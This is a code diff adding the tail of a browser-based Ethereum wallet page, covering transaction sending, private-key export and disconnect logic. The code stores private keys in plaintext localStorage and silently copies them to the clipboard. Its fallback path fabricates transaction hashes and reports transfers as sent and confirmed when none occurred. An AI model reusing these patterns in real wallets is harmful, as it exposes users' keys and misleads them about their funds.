+          
+          const txHash = await walletClient.sendTransaction({
+            to: recipient,
+            value: window.viem.parseEther(amount.toString()),
+          });
+          
+          showNotification(`Transaction sent! Hash: ${txHash.substring(0, 10)}...`, 'success');
+          
+          // Create transaction object for local storage
+          const tx = {
+            hash: txHash,
+            to: recipient,
+            from: walletData.address,
+            value: amount,
+            gasFee: gasEstimate,
+            timestamp: new Date().toISOString(),
+            status: 'confirmed',
+            type: 'sent',
+            direction: 'out',
+            network: currentNetwork
+          };
+          
+          // Save transaction to storage
+          saveTransaction(tx);
+          
+          // Update sender's balance (deduct amount + gas fee) for current network only
+          updateWalletBalance(walletData.address, totalCost, false);
+          
+          // Update recipient's balance (add amount) for current network only
+          // This will create the recipient wallet if it doesn't exist
+          updateWalletBalance(recipient, amount, true);
+          
+          // Wait for transaction confirmation
+          const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });
+          
+          if (receipt.status === 'success') {
+            showNotification('Transaction confirmed!', 'success');
+            
+            // Update balance display
+            const updatedWallet = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+            if (updatedWallet) {
+              document.getElementById('wallet-balance').textContent = `${updatedWallet.networkBalances[currentNetwork].toFixed(4)} ETH`;
+            }
+            
+            // Reload transaction history
+            loadTransactionHistory();
+          } else {
+            showNotification('Transaction failed to confirm.', 'error');
+          }
+        } catch (error) {
+          console.error('Transaction failed:', error);
+          showNotification(error.shortMessage || 'Transaction failed.', 'error');
+        } finally {
+          const sendButton = document.getElementById('send-transaction-button');
+          sendButton.disabled = false;
+          sendButton.innerHTML = '<i class="fas fa-paper-plane"></i> Send Transaction';
+        }
+      } else {
+        // Fallback to simulated transaction
+        // Create transaction object
+        const tx = {
+          hash: generateValidTransactionHash(),
+          to: recipient,
+          from: walletData.address,
+          value: amount,
+          gasFee: gasEstimate,
+          timestamp: new Date().toISOString(),
+          status: 'confirmed',
+          type: 'sent',
+          direction: 'out',
+          network: currentNetwork
+        };
+        
+        // Save transaction to storage
+        saveTransaction(tx);
+        
+        // Update sender's balance (deduct amount + gas fee) for current network only
+        updateWalletBalance(walletData.address, totalCost, false);
+        
+        // Update recipient's balance (add amount) for current network only
+        // This will create the recipient wallet if it doesn't exist
+        updateWalletBalance(recipient, amount, true);
+        
+        showNotification(`Transaction sent on ${networkNames[currentNetwork]}! ${amount} ETH to ${recipient.substring(0, 10)}...`, 'success');
+        
+        // Update balance display
+        const updatedWallet = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+        if (updatedWallet) {
+          document.getElementById('wallet-balance').textContent = `${updatedWallet.networkBalances[currentNetwork].toFixed(4)} ETH`;
+        }
+        
+        // Reload transaction history
+        loadTransactionHistory();
+      }
+      
+      // Clear form
+      document.getElementById('recipient-address').value = '';
+      document.getElementById('send-amount').value = '';
+      document.getElementById('gas-estimate').textContent = '0 ETH';
+      document.getElementById('total-estimate').textContent = '0 ETH';
+      selfTransferWarning.classList.remove('show');
+    }
+
+    // Export Private Key Function
+    function exportPrivateKey() {
+      const walletData = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+      
+      if (walletData && walletData.privateKey) {
+        // Create a temporary element to copy the private key
+        const tempElement = document.createElement('textarea');
+        tempElement.value = walletData.privateKey;
+        document.body.appendChild(tempElement);
+        tempElement.select();
+        document.execCommand('copy');
+        document.body.removeChild(tempElement);
+        
+        showNotification('Private key copied to clipboard', 'success');
+      } else {
+        showNotification('No private key available for export', 'error');
+      }
+    }
+
+    // Disconnect Wallet Function
+    function disconnectWallet() {
+      localStorage.removeItem(CURRENT_WALLET_KEY);
+      if (balanceInterval) clearInterval(balanceInterval);
+      document.getElementById('private-key-login').value = '';
+      document.getElementById('email').value = '';
+      document.getElementById('wallet-password').value = '';
+      document.getElementById('confirm-password').value = '';
+      
+      // Clear seed phrase inputs
+      const seedInputs = document.querySelectorAll('#seed-phrase-inputs .seed-input');
+      seedInputs.forEach(input => {
+        input.value = '';
+      });
+      
+      showPage(setupChoice);
+      showNotification('Wallet disconnected', 'info');
+    }
+
+    // Initialize the app when the page loads
+    window.addEventListener('DOMContentLoaded', function() {
+      // FIXED: Don't auto-login, always start with setup choice
+      // This ensures users always see the login/setup page first
+      console.log('App initialized - starting with setup choice');
+    });
+
+    // Make functions available globally for onclick handlers
+    window.removeSeedWord = removeSeedWord;
+  </script>
+  
+</body>          
+</html>      
